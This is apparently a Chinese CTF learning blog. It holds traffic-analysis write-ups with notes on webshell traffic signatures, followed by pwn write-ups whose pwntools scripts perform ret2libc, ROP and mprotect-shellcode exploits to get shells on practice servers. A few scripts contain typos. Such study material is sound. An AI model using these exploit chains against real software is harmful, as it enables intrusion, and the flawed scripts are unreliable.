+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">hexdata = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;filepath&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(unhexlify(hexdata))</span><br></pre></td></tr></table></figure></div>
+
+<p>得到的图片是有盲水印的</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-06.png"></p>
+<p>看不清.</p>
+<h2 id="NSSCTF-CISCN-2023-初赛-被加密的生产流量"><a href="#NSSCTF-CISCN-2023-初赛-被加密的生产流量" class="headerlink" title="NSSCTF - [CISCN 2023 初赛]被加密的生产流量"></a>NSSCTF - [CISCN 2023 初赛]被加密的生产流量</h2><p>用wireshark打开之后，发现有很多的modbus流量，且文件名就是modbus，很显然，追踪一下这个，看到了一些两个为一组的字符，题目中也提醒了是被加密的。想到了base加密</p>
+<p>这个题的加密部分不多，手动复制粘贴即可，下面这个脚本（看Wp看到的）算是一个模板，如果以后碰到了特别多的，无法手动的，分析一下加密字符所在位置，用脚本提取</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line">cap = pyshark.FileCapture(input_file=<span class="string">&quot;E:\\OneDrive\\桌面\\CTF\\Misc流量\\modbus.pcap&quot;</span>,tshark_path=<span class="string">&#x27;F:\\ctf\wireshark\\tshark&#x27;</span>,display_filter=<span class="string">&#x27;modbus  &amp;&amp; frame.len == 66&#x27;</span>)</span><br><span class="line"><span class="comment"># input_file 是流量的文件路径，tshark_path是tshark软件在的位置，一般是在WireShark命令下</span></span><br><span class="line"><span class="comment"># 后面的 display_filter 把它看做是wireshark中的过滤器。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex2str</span>(<span class="params"><span class="built_in">id</span>:<span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">id</span>)).replace(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> cap:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(p.modbus.word_cnt) == <span class="number">5</span>: <span class="comment"># 我起初也没懂这个 word_cnt 打开流量包，发现是一个参数，为什么要等于5？ 因为加密的字符显示出来的十六进制数据是5位</span></span><br><span class="line">            tmp = p.modbus.word_cnt</span><br><span class="line">            tmp = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(p.modbus.word_cnt))).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">            flag = flag + tmp</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">flag = hex2str(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-01.png"></p>
+<h2 id="NSSCTF-HGAME-2022-week1-好康的流量"><a href="#NSSCTF-HGAME-2022-week1-好康的流量" class="headerlink" title="NSSCTF - [HGAME 2022 week1]好康的流量"></a>NSSCTF - [HGAME 2022 week1]好康的流量</h2><p>wireshark打开，发现是SMTP和TCP协议，百度了一下啊</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-00.png"></p>
+<blockquote>
+<p>说明是发送了邮件</p>
+</blockquote>
+<p>就随便找，追踪TCP流时发现有base64加密的特征。</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-01.png"></p>
+<blockquote>
+<p>为什么会发现是base64加密？</p>
+</blockquote>
+<p>-&gt; 自己做的时候就直觉，写payload复现的时候发现有告诉是base64加密（追踪TCP流的页面）</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-02.png"></p>
+<p>告诉我们了这是png图片， &#x3D;&gt; base64解码成图片</p>
+<p><a class="link" href="https://www.toolnb.com/tools/base64ToImages.html">在线解码网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>接下来就是对图片的分析，我是先用虚拟机进行了foremost和binwalk 无果</p>
+<p>然后就是用了StegSolve，但是我没发现什么（就几个选项过了一遍，没发现）</p>
+<p>-&gt; 然后去看Wp了，一个是 Green通道2有条码</p>
+<p>-&gt;LSB其实在base64解码的时候算是提醒了（但是我不会调参数）</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-03.png"></p>
+<p><a class="link" href="https://tuzim.net/decode/">解条码网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-04.png"></p>
+<p>两半flag拼接 <code>hgame&#123;ez_1mg_Steg4n0graphy&#125;</code></p>
+<h2 id="攻防世界-流量分析1"><a href="#攻防世界-流量分析1" class="headerlink" title="攻防世界 - 流量分析1"></a>攻防世界 - 流量分析1</h2><p>下载<a class="link" href="https://adworld.xctf.org.cn/media/file/task/52ca22d3-4482-47ec-b6ae-7b702d1594e9.zip">附件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，用wireshark打开，发现是关于gopher协议配合上的sql注入（gopher应该是ssrf，我光知道这个打redis什么的，没见过利用它写sql注入的），sql语句经过了两次url编码，解码之后发现是 时间盲注（sleep）</p>
+<p>用tshark提取sql语句</p>
+<p><code>tshark -r challenge.pcapng -T fields -Y &quot;http.request.method==GET&quot; -e &quot;frame.len&quot; -e &quot;http.request.uri.query.parameter&quot; &gt; data.txt</code></p>
+<p>-&gt; 前面两三个跟这个有关的，改一下就能直接提取</p>
+<p>-&gt; 写多了，发现了 如果想要自己独立提取信息，逐级的 跟上面的<code> -e &quot;http.request.uri.query.parameter&quot;</code>我自己没独立试过，但是发现这是有技巧的，也算是记住了</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-7-00.png"></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># data.txt的信息是经过二次url编码的，通过这个脚本提取解码后的信息</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\out.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line">lines = f1.readlines()</span><br><span class="line"><span class="built_in">print</span>(lines)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(lines)):</span><br><span class="line">    <span class="built_in">print</span>(lines[i])</span><br><span class="line">    <span class="built_in">str</span> = unquote(unquote(lines[i],<span class="string">&#x27;utf-8&#x27;</span>), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>out.txt</p>
+<p>能力有限，我无法直接光提取sql语句了，但是我想到通过 搜索功能、</p>
+</blockquote>
+<p>(select flag from flag),15,1)，第一条的结果上方就是(select flag from flag),14,1)的最后一位，即第14位的Ascii码值了</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-7-01.png"></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">result = <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">49</span>, <span class="number">113</span>, <span class="number">119</span>, <span class="number">121</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">49</span>, <span class="number">125</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(result)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(result[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="攻防世界-流量分析2"><a href="#攻防世界-流量分析2" class="headerlink" title="攻防世界 - 流量分析2"></a>攻防世界 - 流量分析2</h2><p>导出Http对象，发现每个包中都有几个字符，观察发现拼接起来就是flag</p>
+<p>我做的时候没看到ag只有fl，手动加上ag 提交成功</p>
+<h2 id="23年蓝桥杯的一个题"><a href="#23年蓝桥杯的一个题" class="headerlink" title="23年蓝桥杯的一个题"></a>23年蓝桥杯的一个题</h2><p>用WireShark打开文件，看到了flag.zip &#x3D;&gt;zip的标志PK</p>
+<p>那么过滤一下 <code>http contains &quot;PK&quot;</code>  直接包含flag也可以</p>
+<p><img lazyload src="/images/loading.svg" data-src="/%E6%B5%81%E9%87%8F/4-8-00.png"></p>
+<p>&#x3D;&gt; 用kali中的 foremost分离出来 <code>foremost -T filename</code></p>
+<p><img lazyload src="/images/loading.svg" data-src="/%E6%B5%81%E9%87%8F/4-8-01.png" alt="4-8-01"></p>
+<p>打开flag.zip文件，发现有个flag.txt，但是有密码，有注释<code>密码的正则：ChunQiu\d&#123;4&#125;</code></p>
+<p><img lazyload src="/images/loading.svg" data-src="/%E6%B5%81%E9%87%8F/4-8-02.png"></p>
+<p>\d &#x3D;&gt; 正则匹配，表示一个数字 {4} 匹配四次</p>
+<p>&#x3D;&gt; ChunQiu???? 四个数字</p>
+<p>&#x3D;&gt; 想到掩码破解</p>
+<p><img lazyload src="/images/loading.svg" data-src="/%E6%B5%81%E9%87%8F/4-8-03.png"></p>
+<p>打开flag.txt 得到flag</p>
+<h2 id="2021陇剑杯-webshell-—-Webshell流量分析"><a href="#2021陇剑杯-webshell-—-Webshell流量分析" class="headerlink" title="2021陇剑杯 - webshell — Webshell流量分析"></a>2021陇剑杯 - webshell — Webshell流量分析</h2><p><a class="link" href="https://pan.baidu.com/s/1X4Ujko8SQshNpnqyZq4C0w?pwd=1234">附件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><code>第一问：找到黑客登录系统使用的密码</code></p>
+<p>-&gt; 用wireshark打开，随便找一找，因为是密码 第一想法是post方法（隐蔽安全）</p>
+<p>-&gt; 在<code>http.request.method == &quot;POST&quot; &amp;&amp; http contains &quot;login&quot;</code>可以找到</p>
+<p><code>第二问：黑客修改了一个日志文件，日志文件的绝对路径</code></p>
+<p>-&gt; 日志文件的内容，是通过TCP流传输的。我们要追踪TCP流</p>
+<p>-&gt; 第一下肯定先直接过滤tcp流，直接对第一个流量包追踪tcp流 能看到明显特征</p>
+<p>**-&gt; 我第一时间没想到tcp流 [ 看Wp说到的，且要与之前的1.php相联系 ]  **</p>
+<p><img lazyload src="/images/loading.svg" data-src="/%E6%B5%81%E9%87%8F/4-16-00.png"></p>
+<p><code>第三问：黑客获取webshell后，权限是？</code></p>
+<p>-&gt; 想到之前看到了有whami，<code>tcp contains &quot;whami&quot;</code> 无果</p>
+<p>-&gt; 最后在流量包中看到了www-data 但我不知道这是一种权限的名称（我只知道root和普通用户）</p>
+<p>-&gt; 结果就是 www-data</p>
+<p><code>第四问：webshell文件名</code></p>
+<p>-&gt; 我们之前看到有<code>ini_set</code> &#x3D;&gt; 1.php</p>
+<p>-&gt; ini_set 是蚁剑webshell的流量特征</p>
+<p><code>第五问：黑客上传的代理工具客户端名字</code></p>
+<p>-&gt; </p>
+<p><code>第六问：黑客代理工具的回连服务端IP是</code></p>
+<p><code>第七问：黑客的socks5的连接账号、密码是</code></p>
+<hr>
+<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><p><a class="link" href="https://blog.csdn.net/m0_51198141/article/details/132643738">Wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link" href="https://www.cnblogs.com/B0like/p/17486657.html">webshell流量特征01 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link" href="https://www.clementi.top/2023/06/21/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">webshell流量特征02 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<blockquote>
+<p>编码器：对发送的流量进行编码，服务端再对流量进行解码</p>
+<p>解码器：服务端对返回流量编码，需要客户端通过解码器解码还原流量接收 </p>
+</blockquote>
+<blockquote>
+<p>蚁剑的webshell来自菜刀，流量特征与菜刀相似</p>
+</blockquote>
+<blockquote>
+<p>蚁剑流量特征：默认UA头是antswordxxx（可改） 正文内容用URL加密，解密后流量中最明显的是ini_set(“display_errors”,”0”)</p>
+<p>这段代码基本上所有webshell工具都有，不过大部分都进行了编码，而蚁剑是明文</p>
+<p>参数名：0x……&#x3D;</p>
+</blockquote>
+<blockquote>
+<p>冰蝎：使用AES 128位对称加密的加密webshell ； Accept字段（存在于冰蝎任何一个通信阶段）</p>
+</blockquote>
+<blockquote>
+<p>哥斯拉：cookie最后一个值后面跟有;分号</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Misc</category>
+      </categories>
+      <tags>
+        <tag>流量分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUU平台的Pwn题记录</title>
+    <url>/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/</url>
+    <content><![CDATA[<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><h4 id="64位泄露ret2libc"><a href="#64位泄露ret2libc" class="headerlink" title="-&gt;64位泄露ret2libc"></a>-&gt;64位泄露ret2libc</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 思路：利用ret2libc泄露地址，从而达到system(&quot;bin/sh&quot;)</span></span><br><span class="line"><span class="comment"># 0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004006b9 : ret</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25216</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret_addr = <span class="number">0x400c83</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.recvuntil(b&#x27;Input your choice!\n&#x27;,True)</span></span><br><span class="line"><span class="comment"># r.sendline(b&#x27;1&#x27;)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) <span class="comment"># 不满足8位的用0补齐</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr) <span class="comment"># 利用LibcSearcher模块找到libc的版本 [libc6_2.27-3ubuntu1_amd64]</span></span><br><span class="line">offest = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>) <span class="comment"># 算偏移量</span></span><br><span class="line">binsh = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment"># 任一函数地址 = 偏移量 + libc中对应函数的地址</span></span><br><span class="line">system = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(ret_addr) + p64(rdi_ret_addr) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><h4 id="32位-ret2libc"><a href="#32位-ret2libc" class="headerlink" title="-&gt;32位 ret2libc"></a>-&gt;32位 ret2libc</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">![libc](BUU%E5%<span class="number">88</span>%B7%E9%A2%<span class="number">98</span>/libc.png)<span class="comment"># Libc泄露：通过什么函数来泄露？ 找到这个函数之后，elf.got elf.plt , </span></span><br><span class="line"><span class="comment"># Libc泄露：通过write函数来泄露。</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29598</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">0</span>) + p32(write_pot) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#选择 libc6-i386_2.27-3ubuntu1_amd64 这个libc版本</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libcsearch.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libc.png"></p>
+<p>泄露出来一个函数的真实地址后，去那个网站搜索一下 对应的版本 </p>
+<p>-&gt; 如果只泄露出来一个函数，可能对应有很多个版本，可以泄露多个函数缩小范围（因为有多个版本时，需要一个一个试）</p>
+<p>-&gt; 下面这个图应该就是对应 offest的解释吧（看别人的Wp之后的理解）</p>
+<p>我们此时应该已知 &#x3D;&gt; write函数真实地址 知道了两个write_offest system_offest</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">system_real_addr = write_real_addr + system_offest - write_offest</span><br><span class="line">bin_sh_real_addr = write_real_addr + str_bin_sh_offest - write_offest</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>checksec一下：</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/01.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/00.png"></p>
+<p>可知将var[13]赋值一个17(0x11)就可以得到shell</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>但是这个payload并没有打通。</p>
+<p><strong>这里有个知识点:</strong></p>
+<blockquote>
+<p>qword全称是Quad Word。2个字节就是1个Word（1个字，16位），q就是英文quad-这个词根（意思是4）的首字母，所以它自然是word（2字节，0~2^16-1）的四倍，8字节</p>
+</blockquote>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p64(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><h3 id="学习：32位和64位传参的区别"><a href="#学习：32位和64位传参的区别" class="headerlink" title="学习：32位和64位传参的区别"></a>学习：32位和64位传参的区别</h3><p><strong>32位：</strong>直接将参数放在栈中</p>
+<p><strong>64位：</strong>前六个参数放在寄存器中（rdi rsi rdx rcx r8 r9），如果还有参数，那再依次放入栈中</p>
+<h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a><strong>题解：</strong></h3><p>这个题是64位程序，在ida中打开，发现有栈溢出漏洞（vulnerable_function函数中）</p>
+<p><code>Shift + F12</code> 可以看到有<code>system</code>函数和 <code>/bin/sh</code>字符串</p>
+<p>-&gt; 先覆盖buf和rbp</p>
+<p>-&gt; 然后是 pop rdi ret &#x3D;&gt; 将栈顶元素（binsh字符串的地址）弹入rdi寄存器中，并且返回到下一指令处</p>
+<p>-&gt; 然后是返回到system()的地址</p>
+<p>-&gt; 参数就是rdi寄存器中的 binsh字符串</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span><span class="number">26999</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x600A90</span></span><br><span class="line">system_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">rdi_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">payload = cyclic(<span class="number">0x80</span> + <span class="number">0x08</span>) + p64(rdi_ret_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>rdi的地址这样找：</p>
+<p><code>ROPgadget --binary level2_x64 --only &#39;pop|ret&#39;</code></p>
+</blockquote>
+<h2 id="not-the-same-3dsctf-2016-静态-32位"><a href="#not-the-same-3dsctf-2016-静态-32位" class="headerlink" title="not_the_same_3dsctf_2016[静态 32位]"></a>not_the_same_3dsctf_2016[静态 32位]</h2><p><code>ctrl + x</code> 查看调用字符串的位置</p>
+<p><code>ctrl + s</code>调出程序的段表，</p>
+<p><code>mprotect(void *addr, size_t len, int prot)函数</code></p>
+<p>-&gt; addr 内存启始地址；len 修改内存的长度；prot 内存的权限</p>
+<p>-&gt; 将.got.plt段改写为可读可写可执行的</p>
+<p><strong>肯定有人疑问了为什么是0x80EB000而不是bss段的开头0x80EBF80，因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25763</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">addr=<span class="number">0x80eb000</span></span><br><span class="line">p3_ret=<span class="number">0x806fcc8</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(<span class="built_in">len</span>(shellcode))+p32(addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><p>checksec一下 32位 有NX保护（栈不可执行），canary保护（会放入一个值，在返回的时候会进行检查，得保证这个值没变）</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/02.png"></p>
+<p>偏移量的计算 10 &#x3D;&gt; 我们输入的数据是从第十个开始的</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/03.png"></p>
+<p>A的ascii值是65 &#x3D;&gt; 对应十六进制的0x41             a的ascii值是97 &#x3D;&gt; 对应十六进制的0x61</p>
+<p>程序要求我们输入的值与随机数相等，才可以执行<code>system(&#39;bin/sh&#39;)</code></p>
+<p>&#x3D;&gt; 由于存在格式化字符串漏洞</p>
